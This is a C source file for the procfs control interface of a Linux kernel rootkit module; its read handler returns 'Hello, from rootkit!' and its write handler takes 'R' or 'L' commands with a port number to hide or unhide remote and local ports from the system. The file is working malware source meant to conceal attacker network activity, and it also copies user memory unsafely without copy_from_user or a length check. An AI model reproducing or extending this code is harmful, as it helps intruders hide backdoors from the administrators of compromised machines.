#include "procfs.h"
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/stat.h>
#include <linux/uaccess.h>
#include <linux/string.h>

#include "tools/string_list.h"

static char MSG_BUFFER[] = "Hello, from rootkit!\n";
static const int msg_buffer_size = sizeof(MSG_BUFFER);

ssize_t proc_node_read(struct file* file, char* buffer, size_t len, loff_t* off ){
    size_t sz = msg_buffer_size >len ? len : msg_buffer_size;
    if(copy_to_user(buffer, MSG_BUFFER,sz)){
        return -EFAULT;
    }
    printk(KERN_INFO "procfs_read: read %lu bytes\n", sz);
    return sz;
}

extern PStringList hidden_ports;

ssize_t proc_node_write (struct file *file, const char *buffer, size_t length, loff_t * off){
    char port_buffer[7] = {0};

    memcpy(port_buffer, buffer, 6);
    port_buffer[6] = 0;

    switch (port_buffer[0]){
    case 'R':
        if(list_have(hidden_ports, port_buffer)){
            list_delete(hidden_ports,port_buffer);
            printk("Unhide remote port %s\n", port_buffer+1);
        }
        else{
            list_insert(hidden_ports, port_buffer);
            printk("Hide remote port %s\n", port_buffer+1);
        }
        break;
    case 'L':
        if(list_have(hidden_ports, port_buffer)){
            list_delete(hidden_ports,port_buffer);
            printk("Unhide local port %s\n", port_buffer+1);
        }
        else{
            list_insert(hidden_ports, port_buffer);
            printk("Hide local port %s\n", port_buffer+1);
        }
        break;
    default:
        printk(KERN_INFO"Unknown port %s\n", port_buffer);
    }
    return -EINVAL;
}
